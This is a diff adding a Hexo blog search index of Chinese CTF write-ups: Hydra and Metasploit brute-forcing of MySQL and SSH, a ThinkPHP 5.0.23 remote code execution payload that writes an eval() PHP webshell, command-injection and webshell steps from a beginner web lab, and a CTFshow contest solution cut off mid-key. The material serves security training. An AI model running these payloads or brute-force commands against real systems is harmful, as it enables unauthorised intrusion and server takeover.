@@ -1,0 +1,974 @@
+<?xml version="1.0" encoding="utf-8"?>
+<search>
+  <entry>
+    <title>Mysql密码爆破</title>
+    <url>/2025/01/18/Mysql%20-%20%E5%AF%86%E7%A0%81%E7%88%86%E7%A0%B4/</url>
+    <content><![CDATA[<h1 id="Mysql-密码爆破"><a href="#Mysql-密码爆破" class="headerlink" title="Mysql - 密码爆破"></a>Mysql - 密码爆破</h1><p>弱口令，用户名是root</p>
+<p>需要用到MSF</p>
+<figure class="highlight ebnf"><table><tr><td class="code"><pre><span class="line"><span class="attribute">msfconsole</span></span><br></pre></td></tr></table></figure>
+
+<p>使用mysql爆破破解模块</p>
+<figure class="highlight actionscript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">use</span> auxiliary/scanner/mysql/mysql_login</span><br></pre></td></tr></table></figure>
+
+<p>显示所有参数</p>
+<figure class="highlight pgsql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">show</span> <span class="keyword">options</span></span><br></pre></td></tr></table></figure>
+
+<p>暴力破解</p>
+<figure class="highlight gams"><table><tr><td class="code"><pre><span class="line"><span class="keyword">set</span> rhosts <span class="comment">node.hackhub.get-shell.com</span>			//设置目标服务器的<span class="comment">ip</span>地址</span><br><span class="line"><span class="keyword">set</span> <span class="comment">rport 41148</span> 			        //设置目标端口，为<span class="comment">MySQL</span>开启的端口号，默认是<span class="comment">3306</span></span><br><span class="line"><span class="keyword">set</span> <span class="comment">username root</span>				    //设置用户名，默认即为<span class="comment">root</span></span><br><span class="line"><span class="keyword">set</span> <span class="comment">pass_file pass.txt</span>   //指定密码字典文件的路径</span><br><span class="line">run					                //开始爆破</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight dsconfig"><table><tr><td class="code"><pre><span class="line"><span class="string">set</span> <span class="string">rhosts</span> <span class="string">node</span>.<span class="string">hackhub</span>.<span class="built_in">get-shell.com</span>			</span><br><span class="line"><span class="string">set</span> <span class="string">rport</span> <span class="string">41148</span> 			        </span><br><span class="line"><span class="string">set</span> <span class="string">username</span> <span class="string">root</span>				    </span><br><span class="line"><span class="string">set</span> <span class="string">pass_file</span> <span class="string">pass</span>.<span class="string">txt</span>   </span><br><span class="line"><span class="string">run</span>	</span><br></pre></td></tr></table></figure>
+
+<p>九头蛇也可以Hydra</p>
+<figure class="highlight dsconfig"><table><tr><td class="code"><pre><span class="line"><span class="string">hydra</span> -<span class="string">L</span> <span class="string">user</span>.<span class="string">txt</span> -<span class="string">P</span> <span class="string">pass</span>.<span class="string">txt</span> -<span class="string">t</span> <span class="string">2</span> -<span class="string">e</span> <span class="string">n</span> -<span class="string">f</span> -<span class="string">v</span> -<span class="string">s</span> <span class="string">41148</span> <span class="string">node</span>.<span class="string">hackhub</span>.<span class="built_in">get-shell.com</span> <span class="string">mysql</span></span><br></pre></td></tr></table></figure>
+
+<p>![image-20250118222325340](.&#x2F;Mysql - 密码爆破&#x2F;image-20250118222325340.png)</p>
+<p>Navicat连接得到flag</p>
+<p>&#x2F;![image-20250118222941012](.&#x2F;Mysql - 密码爆破&#x2F;image-20250118222941012.png)</p>
+]]></content>
+      <tags>
+        <tag>工具利用</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>SSH密码爆破</title>
+    <url>/2025/01/18/SSH-%E7%88%86%E7%A0%B4/</url>
+    <content><![CDATA[<h1 id="SSH-密码爆破"><a href="#SSH-密码爆破" class="headerlink" title="SSH - 密码爆破"></a>SSH - 密码爆破</h1><ul>
+<li>默认用户：<strong>user</strong></li>
+</ul>
+<p>利用工具Hydra(海德拉中文又称九头蛇)</p>
+<p>命令</p>
+<figure class="highlight dsconfig"><table><tr><td class="code"><pre><span class="line"><span class="string">hydra</span> -<span class="string">L</span> <span class="string">&#x27;/var/run/vmblock-fuse/blockdir/T7Mrmv/user.txt&#x27;</span> -<span class="string">P</span> <span class="string">&#x27;/var/run/vmblock-fuse/blockdir/h4aG9a/常用密码.txt&#x27;</span> -<span class="string">vV</span> -<span class="string">o</span> <span class="string">ssh</span>.<span class="string">txt</span> -<span class="string">t</span> <span class="string">5</span> -<span class="string">s</span> <span class="string">48720</span> <span class="string">node</span>.<span class="string">hackhub</span>.<span class="built_in">get-shell.com</span> <span class="string">ssh</span></span><br></pre></td></tr></table></figure>
+
+<p>-L 用户名字典 -P密码字典 </p>
+<p>-o把成功的输出到ssh.txt文件</p>
+<p>-vV显示详情信息</p>
+<p>-s指定端口（修改默认22端口使用该参数）</p>
+<p><img src="/2025/01/18/SSH-%E7%88%86%E7%A0%B4/image-20250118213027300.png" alt="image-20250118213027300"></p>
+<p>例如我这里是48720端口</p>
+<p>爆破成功</p>
+<p><img src="/2025/01/18/SSH-%E7%88%86%E7%A0%B4/image-20250118213058709.png" alt="image-20250118213058709"></p>
+<p>用户名user密码123456</p>
+<p>输出的ssh.txt文件</p>
+<p><img src="/2025/01/18/SSH-%E7%88%86%E7%A0%B4/image-20250118213127988.png" alt="image-20250118213127988"></p>
+<p><img src="/2025/01/18/SSH-%E7%88%86%E7%A0%B4/image-20250118215113512.png" alt="image-20250118215113512"></p>
+<p>sudo su切换到root读取flag</p>
+]]></content>
+      <tags>
+        <tag>工具利用</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>ThinkPHP 5.0.23 - 远程代码执行</title>
+    <url>/2025/01/18/ThinkPHP%205.0.23%20-%20%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C/</url>
+    <content><![CDATA[<h1 id="ThinkPHP-5-0-23-远程代码执行"><a href="#ThinkPHP-5-0-23-远程代码执行" class="headerlink" title="ThinkPHP 5.0.23 - 远程代码执行"></a>ThinkPHP 5.0.23 - 远程代码执行</h1><p>method的方法中没有正确处理方法名，导致攻击者可以调用Request类任意方法并构造利用链，从而导致远程代码执行漏洞。</p>
+<p>利用方法URL后添加&#x2F;index.php?s&#x3D;captcha，抓包修改传参方式为POST</p>
+<figure class="highlight oxygene"><table><tr><td class="code"><pre><span class="line">_method=__construct&amp;filter[]=system&amp;<span class="keyword">method</span>=<span class="title function_">get</span>&amp;<span class="title function_">server</span>[<span class="title function_">REQUEST_METHOD</span>]=<span class="title function_">pwd</span></span><br></pre></td></tr></table></figure>
+
+<figure class="highlight http"><table><tr><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/index.php?s=captcha</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>node.hackhub.get-shell.com:48782</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>*/*</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>en</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/x-www-form-urlencoded</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>72</span><br><span class="line"></span><br><span class="line"><span class="language-oxygene">_method=__construct&amp;filter[]=system&amp;<span class="keyword">method</span>=<span class="title function_">get</span>&amp;<span class="title function_">server</span>[<span class="title function_">REQUEST_METHOD</span>]=<span class="title function_">pwd</span></span></span><br></pre></td></tr></table></figure>
+
+<p>pwd是查看当前目录，我们可以在这里写入任何命令</p>
+<p>先查看我们在哪里，然后好写入一句话</p>
+<p>![image-20250118204107550](.&#x2F;ThinkPHP 5.0.23 - 远程代码执行&#x2F;image-20250118204107550.png)</p>
+<p>拦截响应得到目录</p>
+<p>![image-20250118204125003](.&#x2F;ThinkPHP 5.0.23 - 远程代码执行&#x2F;image-20250118204125003.png)</p>
+<p>&#x2F;var&#x2F;www&#x2F;public</p>
+<p>写入一句话</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;?php @eval(<span class="subst">$_POST</span>[&#x27;cmd&#x27;]);?&gt;&quot;</span> &gt; /<span class="keyword">var</span>/www/<span class="keyword">public</span>/shell.php</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight php-template"><table><tr><td class="code"><pre><span class="line"><span class="language-xml">_method=__construct&amp;filter[]=system&amp;method=get&amp;server[REQUEST_METHOD]=echo &#x27;</span><span class="language-php"><span class="meta">&lt;?php</span> @<span class="keyword">eval</span>(<span class="variable">$_POST</span>[cmd]);<span class="meta">?&gt;</span></span><span class="language-xml">&#x27; &gt; shell.php</span></span><br></pre></td></tr></table></figure>
+
+<p>成功写入</p>
+<p>![image-20250118205903497](.&#x2F;ThinkPHP 5.0.23 - 远程代码执行&#x2F;image-20250118205903497.png)</p>
+]]></content>
+      <tags>
+        <tag>漏洞复现</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>mimikyu靶场</title>
+    <url>/2024/11/14/getshell%5Bmimikyu%5D/</url>
+    <content><![CDATA[<h1 id="靶机类型：CTF-WEB入门靶场"><a href="#靶机类型：CTF-WEB入门靶场" class="headerlink" title="靶机类型：CTF-WEB入门靶场"></a>靶机类型：CTF-WEB入门靶场</h1><h3 id="Pass01-Source"><a href="#Pass01-Source" class="headerlink" title="Pass01 Source"></a>Pass01 Source</h3><p>F12查看源码得到flag</p>
+<p>常见查看源码方式  F12  右键查看  Ctrl+U  </p>
+<p>网页地址栏前面加上入view-source</p>
+<h3 id="Pass02-Response"><a href="#Pass02-Response" class="headerlink" title="Pass02 Response"></a>Pass02 Response</h3><p>点击去显示Homepage 类似起始页面的意思</p>
+<p>仔细看URL是</p>
+<p><a href="http://node.hackhub.get-shell.com:49198/Pass02/inbex.php">http://node.hackhub.get-shell.com:49198/Pass02/inbex.php</a></p>
+<p>是inbex   索引页是index.php  直接访问还不行 会重定向到inbex  抓包 拦截响应即可获得flag</p>
+<h3 id="Pass03-GET"><a href="#Pass03-GET" class="headerlink" title="Pass03 GET"></a>Pass03 GET</h3><p>请用GET方式提交一个名为1,值为2的变量</p>
+<p>?1&#x3D;2</p>
+<p>即可</p>
+<h3 id="Pass04-robots"><a href="#Pass04-robots" class="headerlink" title="Pass04 robots"></a>Pass04 robots</h3><p>爬虫协议  访问robots.txt 然后看到disallow 访问f1ag_1s_h3re.php即可</p>
+<h3 id="Pass05-Backup"><a href="#Pass05-Backup" class="headerlink" title="Pass05 Backup"></a>Pass05 Backup</h3><p>考查网站的备份文件</p>
+<p>dirsearch开扫即可</p>
+<p>dirsearch -u url</p>
+<p>扫到个 <a href="http://www.zip/">www.zip</a></p>
+<p>访问即可下载下来源码  成功得到flag</p>
+<h3 id="Pass06-Cookie"><a href="#Pass06-Cookie" class="headerlink" title="Pass06 Cookie"></a>Pass06 Cookie</h3><p>访问  老师上课讲的夹心饼干 就说cookie</p>
+<p>查看cookie  发现个参数  look&#x3D;cookie.php</p>
+<p>提示我们查看cookie.php  到了cookie.php界面</p>
+<p>又提示我们看response 查看响应  发现有个叫Flag的响应头 得到flag</p>
+<h3 id="Pass07-HTML"><a href="#Pass07-HTML" class="headerlink" title="Pass07 HTML"></a>Pass07 HTML</h3><p>为什么这个按钮不能按</p>
+<p>F12  修改input标签的内容   删掉disabled 按钮即可点击 点击获得flag</p>
+<h3 id="Pass08-XFF-Referer"><a href="#Pass08-XFF-Referer" class="headerlink" title="Pass08 XFF_Referer"></a>Pass08 XFF_Referer</h3><p>ip地址必须为123.123.123.123</p>
+<p>X-Forwarded-For 设置为123.123.123.123</p>
+<p>X-Forwarded-For用于识别客户端的原始IP地址</p>
+<p>必须来自<a href="https://www.google.com/">https://www.google.com</a></p>
+<p>修改Referer</p>
+<p><a href="https://www.google.com/">https://www.google.com</a></p>
+<p>得到flag</p>
+<h3 id="Pass09-PHP"><a href="#Pass09-PHP" class="headerlink" title="Pass09 PHP"></a>Pass09 PHP</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">show_source</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;config.php&quot;</span>);</span><br><span class="line"><span class="variable">$a</span>=@<span class="variable">$_GET</span>[<span class="string">&#x27;a&#x27;</span>];</span><br><span class="line"><span class="variable">$b</span>=@<span class="variable">$_GET</span>[<span class="string">&#x27;b&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$a</span>==<span class="number">0</span> <span class="keyword">and</span> <span class="variable">$a</span>)&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$flag1</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">is_numeric</span>(<span class="variable">$b</span>))&#123;</span><br><span class="line">    <span class="keyword">exit</span>();</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$b</span>&gt;<span class="number">1234</span>)&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$flag2</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>get传入?a&#x3D;’1’</p>
+<p>字符串在和数字比较的时，会将字符串转化为数字，如a转换成False，False又和0弱类型比较是相等的</p>
+<p>get再传入b</p>
+<p>b是数字和字符串时，就退出此脚本，另外还要求b的值还得大于1234，因为不能等于数字和字符串还得大于指定的1234,那么就在数字1234后添加字符串，所以构造的payload为：a&#x3D;&#x3D;a&amp;b&#x3D;9999a</p>
+<h3 id="Pass10-weak-auth"><a href="#Pass10-weak-auth" class="headerlink" title="Pass10 weak_auth"></a>Pass10 weak_auth</h3><p>弱口令爆破</p>
+<p>用户名admin</p>
+<p>爆破密码  如果用户名也不确定 直接集束炸弹爆破用户名和密码</p>
+<h3 id="Pass11-Webshell"><a href="#Pass11-Webshell" class="headerlink" title="Pass11 Webshell"></a>Pass11 Webshell</h3><p>已经传入一句话木马了  直接利用</p>
+<p>shell&#x3D;system(ls);  得到flag.txt  然后读取</p>
+<p>shell&#x3D;system(‘tac flag.txt’);</p>
+<h3 id="Pass12-Rce"><a href="#Pass12-Rce" class="headerlink" title="Pass12 Rce"></a>Pass12 Rce</h3><p>远程命令执行 审计代码  发现能执行系统命令的代码</p>
+<p>管道符命令利用即可    </p>
+<p>127.0.0.1 | ls</p>
+<p>得到flag.txt</p>
+<p>127.0.0.1 | tac flag.txt</p>
+<p>得到flag</p>
+<p>使用此管道符“|”可以将两个命令分隔开，“|”左边命令的输出就会作为“|”右边命令的输入，此命令可连续使用，第一个命令的输出会作为第二个命令的输入，第二个命令的输出又会作为第三个命令的输入，依此类推。</p>
+<figure class="highlight 1c"><table><tr><td class="code"><pre><span class="line">多命令执行符              格式                        作用</span><br><span class="line">     ;               命令<span class="number">1</span>;命令<span class="number">2</span>             多个命令顺序执行，命令之间无任何逻辑关系</span><br><span class="line">    <span class="meta">&amp;&amp;               命令1&amp;&amp;命令2            逻辑与：当命令1正确执行后，命令2才会正确执行，否则命令2不会执行</span></span><br><span class="line">    <span class="string">||               命令1||命令2            逻辑或：当命令1不正确执行后，命令2才会正确执行，否则命令2不会执行</span></span><br></pre></td></tr></table></figure>
+
+<p>地址<a href="https://blog.csdn.net/zqg4919/article/details/75417919">https://blog.csdn.net/zqg4919/article/details/75417919</a></p>
+]]></content>
+  </entry>
+  <entry>
+    <title>CTFshow元旦渗透赛第一章</title>
+    <url>/2025/01/15/ctfshow%E6%B8%97%E9%80%8F%E8%B5%9B/</url>
+    <content><![CDATA[<h1 id="第一章"><a href="#第一章" class="headerlink" title="第一章"></a>第一章</h1><h2 id="启程"><a href="#启程" class="headerlink" title="启程"></a>启程</h2><p>得到个压缩包，我以为和给的提示的RSA有关系，没找到密文，爆破得到密码654321</p>
+<p><img src="/2025/01/15/ctfshow%E6%B8%97%E9%80%8F%E8%B5%9B/image-20250113201551328.png" alt="image-20250113201551328"></p>
+<p>flag:ctfshow{654321}</p>
+<h2 id="破解加密通讯"><a href="#破解加密通讯" class="headerlink" title="破解加密通讯"></a>破解加密通讯</h2><p>提交中心网站</p>
+<p>把上面得到的png图片，zsteg看一下，藏了个base64，解码</p>
+<p><img src="/2025/01/15/ctfshow%E6%B8%97%E9%80%8F%E8%B5%9B/image-20250113202045977.png" alt="image-20250113202045977"></p>
+<p><img src="/2025/01/15/ctfshow%E6%B8%97%E9%80%8F%E8%B5%9B/image-20250113202055604.png" alt="image-20250113202055604"></p>
+<p>执行上面这段代码获得</p>
+<p><img src="/2025/01/15/ctfshow%E6%B8%97%E9%80%8F%E8%B5%9B/image-20250113203827389.png" alt="image-20250113203827389"></p>
+<p>第一次碰见还能把密文藏到库里，出题者创建一个库，你下载执行得到被隐藏的信息</p>
+<figure class="highlight asciidoc"><table><tr><td class="code"><pre><span class="line"><span class="symbol">WARNING: </span>Running pip as the <span class="emphasis">&#x27;root&#x27;</span> user can result in broken permissions and conflicting behaviour with the system package manager. It is recommended to use a virtual environment instead: https://pip.pypa.io/warnings/venv          </span><br><span class="line"><span class="section">请使用组织分配的私钥解密后使用                                               </span></span><br><span class="line"><span class="section">----------------------------------------------------------</span></span><br><span class="line">2024-12-16</span><br><span class="line"><span class="section">gHgAsclUVPhWDv4S8Oa8SuRTDaj+V0dI4z2jrQwfvfSFWilWwMKwNULUI48UBLS2shZcm/yv2/e5Hq5VRDfXkdxCYQMdvdnvONtpm2yNiIaLpDV4Rs8fOXJ6kcaeT+mg4RkIIFgx35w4J1KgO72pSP8j1p+R9f9TNMafwJ91XmO4QTcOYkMKQMddKvhbyMXzJkSS0uZqEppNSIUnVX9b7m8PmMjV0uHShvb1Zc8UQWJWUJ3cOxwNasOeMQGxJrZXPkxIxDYzm3f0tXbCgvdgNZ8TQY7u+iCXjOtD6xnUsdSahnPq14BD30CilIfsG0r/klPHfxQ+psmHSX47Ylai0TtgfbHWJJ4lSo0ojMvTx6HYK8zmAoCmg4OGXDbv/IjJgYU1w24na0iXZCNtcjB9MLRNck00c20f/uS64Ss0Ixii8nmfsFOjQBCcIYN+HGmOnj5Uw8DVJrxlOmcfQciG3rzuIvYlbOdGMcyarTy2Ba7iZfoovYZObPscAwhNLWqbU4tuR78aOVxiXTFRY7+Y0x2eRT5sulcvB3vsKuDMlNrxaUgiFUohPBZGNsgQgyCPxxqk0NpUn0bbHLH+vBebjJxaim4AU28ctWW8xv7xpxVttb0EoohtK2cIHr79ep5XrU/rv4R58obD/o+QqI1Mrb4wwpX9tsL7ZbROw/MXJwM=</span></span><br><span class="line"><span class="section">----------------------------------------------------------</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="section">请使用组织分配的私钥解密后使用</span></span><br><span class="line"><span class="section">----------------------------------------------------------</span></span><br><span class="line">2024-04-11</span><br><span class="line"><span class="section">Z93Khatj+AWZcpPwIqu8LzbJ8xb8CuVMI8okE0qwoQD2IC2lixg77mJZireOrbW7zFkDsk1hP67dROJZwVUDrYot2g5GxX/xy7lGjIblUX4iJVUtP4mHqZUgKROaLoh/gippMpP+8Ik2X/QRBx5gdhq0xam+wuVC+77/tyu8Fd/DohKbAMp8aaJsFr/W4mLDZ1gv4JK+2O3l+bAvpodBRTzb0ld5zD2ueYvjTudoDjdanQP1oVTH7pkDO2Vb+SsdIyTi2C410JEOF4Qm8mzVHtiOunOcLVpAlQsM6/LdhqsTNelXl/Myb84NGxwGWVmx6j2QejiL7S1hHeHlmQ9ExHeURPdZAvKhgMCemYXu3BGlFq3ydb5SkqwLFvM4vJ6XUBcWkHT8eijBFF6Y7YgOv9GRvBTnsAQhUBp4W4EAMtXkDdToG+S8ZO7El8Gh8jaWC49n5CuUBRz3z2GeOVbsBamfLV06IO5v78jGHXig4saEFKHvYSIGewyUCVQEGoIR5xOTJBTUTePAdvQjfg28vZZxFB/hIYNDUHkaek1Mg1UH5HWGgsCX1In5hSX/9eBkznEhzeWnJ1yMsYkj+ddN34DLQSrHc83geXMcoW3Ah3cAQG8E8bszvKL3hme+T5rOeENjkOAgYhf84k4YlxDskdwvzyu8HkE9CSaBpDP6lKI=</span></span><br><span class="line"><span class="section">----------------------------------------------------------</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="section">请使用组织分配的私钥解密后使用</span></span><br><span class="line"><span class="section">----------------------------------------------------------</span></span><br><span class="line">2024-03-05</span><br><span class="line"><span class="section">ckDSthpl5DDJMpBE26Jqk8EjaSq7MUntdwLHPouwx6D38un6WQfLJ9wgDyjh9GA/ICJR7WrwWsVinr6y3u9w+ubMZ0mqmtnphzQraagk8NkKc1u1+qGp8llsud3C8mvJWa4GYa9KEhnACDHwppPKJDCfr1HKwPbR0NIi+1Aunmy6DeOKRkFwysnrSco5QiiC9+gdXFhQDmN9KEiYW6Pc3mWVbqFiJgRW3/Df6638oGPm6AUcgRnEWMKiluyN81frM9VNtCeJ64YrU6Rgx4D153YxNNQbLTcyCQMamHTrJnhxPojkuDqbEcU+iiN4offwrQyr4eEu9ecvmyD2w/n7pAOsVnqSzroBujVA+CK6Zq8Uie15mL5yWG9hD5ZcbSwnRmtqK3yl0Xl91hgn1JqcIEKtf+MnMQPr80uoxT3mz8IX8pyVnyyw1x6F+IK1I2G+5w6rUDjhzIbME5XB9hopwcswsXrMo9PP6/5Sz1noJrsu6k6WN8ZM0MyRIav+xuKP1+cYzlPSQZrMo3L4ieHQnBbsoyzGVf9QONMwaooGOrxu88ZWlGe8e7eyCzteeNSVOC2zqtQiwQJIgfp2UwTymA/cEjOICWVzUXwbE5wWUBPCLp2C/XWc82byrOHAFXHLOVKgolVToUpZ5uOvizgk/ahaxdGxGa9CrRyr6sf+goA=</span></span><br><span class="line"><span class="section">----------------------------------------------------------</span></span><br></pre></td></tr></table></figure>
+
+<p>执行</p>
+<figure class="highlight dart"><table><tr><td class="code"><pre><span class="line">pip <span class="keyword">show</span> secretMessageResponse</span><br></pre></td></tr></table></figure>
+
+<p>查看库的信息</p>
+<p>找到目录读取加密方式</p>
+<p><img src="/2025/01/15/ctfshow%E6%B8%97%E9%80%8F%E8%B5%9B/image-20250115182443478.png" alt="image-20250115182443478"></p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> base64,datetime</span><br><span class="line"></span><br><span class="line">message = &#123;</span><br><span class="line">    <span class="string">&quot;inputMessage_20241216&quot;</span> :<span class="string">&#x27;&#x27;&#x27;gHgAsclUVPhWDv4S8Oa8SuRTDaj+V0dI4z2jrQwfvfSFWilWwMKwNULUI48UBLS2shZcm/yv2/e5Hq5VRDfXkdxCYQMdvdnvONtpm2yNiIaLpDV4Rs8fOXJ6kcaeT+mg4RkIIFgx35w4J1KgO72pSP8j1p+R9f9TNMafwJ91XmO4QTcOYkMKQMddKvhbyMXzJkSS0uZqEppNSIUnVX9b7m8PmMjV0uHShvb1Zc8UQWJWUJ3cOxwNasOeMQGxJrZXPkxIxDYzm3f0tXbCgvdgNZ8TQY7u+iCXjOtD6xnUsdSahnPq14BD30CilIfsG0r/klPHfxQ+psmHSX47Ylai0TtgfbHWJJ4lSo0ojMvTx6HYK8zmAoCmg4OGXDbv/IjJgYU1w24na0iXZCNtcjB9MLRNck00c20f/uS64Ss0Ixii8nmfsFOjQBCcIYN+HGmOnj5Uw8DVJrxlOmcfQciG3rzuIvYlbOdGMcyarTy2Ba7iZfoovYZObPscAwhNLWqbU4tuR78aOVxiXTFRY7+Y0x2eRT5sulcvB3vsKuDMlNrxaUgiFUohPBZGNsgQgyCPxxqk0NpUn0bbHLH+vBebjJxaim4AU28ctWW8xv7xpxVttb0EoohtK2cIHr79ep5XrU/rv4R58obD/o+QqI1Mrb4wwpX9tsL7ZbROw/MXJwM=&#x27;&#x27;&#x27;</span>,</span><br><span class="line">    <span class="string">&quot;inputMessage_20240411&quot;</span> : <span class="string">&#x27;&#x27;&#x27;Z93Khatj+AWZcpPwIqu8LzbJ8xb8CuVMI8okE0qwoQD2IC2lixg77mJZireOrbW7zFkDsk1hP67dROJZwVUDrYot2g5GxX/xy7lGjIblUX4iJVUtP4mHqZUgKROaLoh/gippMpP+8Ik2X/QRBx5gdhq0xam+wuVC+77/tyu8Fd/DohKbAMp8aaJsFr/W4mLDZ1gv4JK+2O3l+bAvpodBRTzb0ld5zD2ueYvjTudoDjdanQP1oVTH7pkDO2Vb+SsdIyTi2C410JEOF4Qm8mzVHtiOunOcLVpAlQsM6/LdhqsTNelXl/Myb84NGxwGWVmx6j2QejiL7S1hHeHlmQ9ExHeURPdZAvKhgMCemYXu3BGlFq3ydb5SkqwLFvM4vJ6XUBcWkHT8eijBFF6Y7YgOv9GRvBTnsAQhUBp4W4EAMtXkDdToG+S8ZO7El8Gh8jaWC49n5CuUBRz3z2GeOVbsBamfLV06IO5v78jGHXig4saEFKHvYSIGewyUCVQEGoIR5xOTJBTUTePAdvQjfg28vZZxFB/hIYNDUHkaek1Mg1UH5HWGgsCX1In5hSX/9eBkznEhzeWnJ1yMsYkj+ddN34DLQSrHc83geXMcoW3Ah3cAQG8E8bszvKL3hme+T5rOeENjkOAgYhf84k4YlxDskdwvzyu8HkE9CSaBpDP6lKI=&#x27;&#x27;&#x27;</span>,</span><br><span class="line">    <span class="string">&quot;inputMessage_20240305&quot;</span> : <span class="string">&#x27;&#x27;&#x27;ckDSthpl5DDJMpBE26Jqk8EjaSq7MUntdwLHPouwx6D38un6WQfLJ9wgDyjh9GA/ICJR7WrwWsVinr6y3u9w+ubMZ0mqmtnphzQraagk8NkKc1u1+qGp8llsud3C8mvJWa4GYa9KEhnACDHwppPKJDCfr1HKwPbR0NIi+1Aunmy6DeOKRkFwysnrSco5QiiC9+gdXFhQDmN9KEiYW6Pc3mWVbqFiJgRW3/Df6638oGPm6AUcgRnEWMKiluyN81frM9VNtCeJ64YrU6Rgx4D153YxNNQbLTcyCQMamHTrJnhxPojkuDqbEcU+iiN4offwrQyr4eEu9ecvmyD2w/n7pAOsVnqSzroBujVA+CK6Zq8Uie15mL5yWG9hD5ZcbSwnRmtqK3yl0Xl91hgn1JqcIEKtf+MnMQPr80uoxT3mz8IX8pyVnyyw1x6F+IK1I2G+5w6rUDjhzIbME5XB9hopwcswsXrMo9PP6/5Sz1noJrsu6k6WN8ZM0MyRIav+xuKP1+cYzlPSQZrMo3L4ieHQnBbsoyzGVf9QONMwaooGOrxu88ZWlGe8e7eyCzteeNSVOC2zqtQiwQJIgfp2UwTymA/cEjOICWVzUXwbE5wWUBPCLp2C/XWc82byrOHAFXHLOVKgolVToUpZ5uOvizgk/ahaxdGxGa9CrRyr6sf+goA=&#x27;&#x27;&#x27;</span>,</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">printMessage</span>():</span><br><span class="line">    <span class="keyword">for</span> key, value <span class="keyword">in</span> message.items():</span><br><span class="line">        title = key.replace(<span class="string">&#x27;inputMessage_&#x27;</span>, <span class="string">&#x27;&#x27;</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;\033[1;31m&quot;</span> + <span class="string">&quot;请使用组织分配的私钥解密后使用&quot;</span> + <span class="string">&quot;\033[0m&quot;</span>)</span><br><span class="line">        title = datetime.datetime.strptime(title, <span class="string">&#x27;%Y%m%d&#x27;</span>).strftime(<span class="string">&#x27;%Y-%m-%d&#x27;</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;----------------------------------------------------------&quot;</span>)</span><br><span class="line">        <span class="built_in">print</span>(title)</span><br><span class="line">        <span class="built_in">print</span>(value)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;----------------------------------------------------------&quot;</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;\n&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 最新流通公钥</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">getPublicKey</span>():</span><br><span class="line">    <span class="keyword">return</span> <span class="string">b&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    -----BEGIN PUBLIC KEY-----</span></span><br><span class="line"><span class="string">MIICIjANBgkqhkiG9w0BAQEFAAOCAg8AMIICCgKCAgEAmziayo9Tddo1FYdrtOsw</span></span><br><span class="line"><span class="string">yjLYJ5frYKEwm4rQTsKU8UcdnnDRgms+ZmStoqlH/qi6x+D1K3fvvioCnGZLFHZw</span></span><br><span class="line"><span class="string">BUqbgT5x+qUmUaVMll9FOT7ZJ05w8n8Ljqa1akzFMU5G7YbCr3vQwN63vwvD9/63</span></span><br><span class="line"><span class="string">TDbXkJrv1fGl2rHpPwp5OPCUeCB3nIFIRCWHpJU7sHJqIP5vzV8KNJtbxgR+dhsz</span></span><br><span class="line"><span class="string">dg+NhoBDUpxoVN5lzSKr2TMOLFLZaQR9AWOV/aHV8gjTkTLDZfc+XlfhxiDMTQdi</span></span><br><span class="line"><span class="string">UTbk/tynpt+JFrDA8vL5/TOmuxgumqgXZIPGrIUbwloTYyHD/XXmvXu5KE8g3eMK</span></span><br><span class="line"><span class="string">gxNxuEKM5bMTESBK9A7Q2Kj3eNp0Rvb5Aleg7h8/YbQemGelY/o5xpUyHgHjsfNQ</span></span><br><span class="line"><span class="string">3j/xhdhVCNVaXZF64V/YVpvC9Cq29F7qI+bl6FlN7zSpuHB3QgNS1uXOmjBCsA7y</span></span><br><span class="line"><span class="string">pZoWmdXeaLIO+I3kP48BBSmue4nidJifiK/kSOcZ0iegRXV1hyZ6pYdDE7hM5V5t</span></span><br><span class="line"><span 